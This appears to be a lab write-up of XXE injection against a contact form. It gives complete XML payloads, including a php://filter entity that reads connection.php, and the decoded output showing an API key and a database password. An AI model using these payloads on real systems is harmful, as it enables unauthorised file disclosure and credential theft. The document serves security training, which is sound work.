# Exploiting XXE to Extract Sensitive Information – `connection.php`

### Target: `http://10.129.64.249/index.php`
Vulnerability Type: XML External Entity (XXE) Injection
Objective: Read the contents of connection.php and extract the api_key.

## 1. Initial Discovery
The provided contact form is 
![image](https://github.com/user-attachments/assets/0d43c1bb-78e3-4026-bbe5-879a31fd237d)

After submitting data via the Contact Form, I intercepted the request using Burp Suite and observed the following:
```bash
POST /submitDetails.php HTTP/1.1
Host: 10.129.64.249
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<root>
  <name>Manoj</name>
  <tel>0411639525</tel>
  <email>themanojgh@gmail.com</email>
  <message>thank you</message>
</root>
```
The request body is in XML format, making it a potential target for XXE. Notably, the value inside the <email> tag is reflected in the server's HTTP response, which makes it a suitable injection point for XXE payloads.

## 2. XXE Payload Test
To test for XXE, I inserted an XML DTD and referenced an entity inside the `<email>` field:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
  <name>Manoj</name>
  <tel>0411639525</tel>
  <email>&company;</email>
  <message>thank you</message>
</root>
```
The response echoed back Inlane Freight, confirming that the server parses and expands external XML entities — the application is vulnerable to XXE injection.
![Screenshot 2025-04-24 130856](https://github.com/user-attachments/assets/38c3fd89-e079-45f8-bd7e-9537b17d981e)


## 3. Exploiting XXE for File Disclosure
Using the confirmed vulnerability, I crafted a payload to read the contents of the connection.php file using the `php://filter` wrapper to `base64-encode` the file output:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
  <name>Manoj</name>
  <tel>0411639525</tel>
  <email>&company;</email>
  <message>thank you</message>
</root>
```
![Screenshot 2025-04-24 131619](https://github.com/user-attachments/assets/2a4254f9-07c4-48c4-90d6-e739c53182d9)

The server responded with the base64-encoded contents of the connection.php file.

## 4. Decoding the Output
The output from the server was:
```bash
PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K
Decoded using base64, the PHP source revealed:
```
```bash
<?php

$api_key = "UTM1NjM0MmRjJ2dmcTIZND0wMXJnZXdmc2RmCg";

try {
  $conn = pg_connect("host=localhost port=5432 dbname=users user=postgres password=iUer^vd(e1Pl9)");
}

catch (exception $e) {
  echo $e->getMessage();
}

?>
```
## ✅ Extracted API Key:

UTM1NjM0MmRjJ2dmcTIZND0wMXJnZXdmc2RmCg

## Conclusion
This test demonstrated a classic XXE (XML External Entity) vulnerability in the contact form of the web application. The lack of input validation and the use of outdated XML parsers allowed the injection of external entities, leading to local file disclosure and the extraction of sensitive credentials from server-side configuration files.
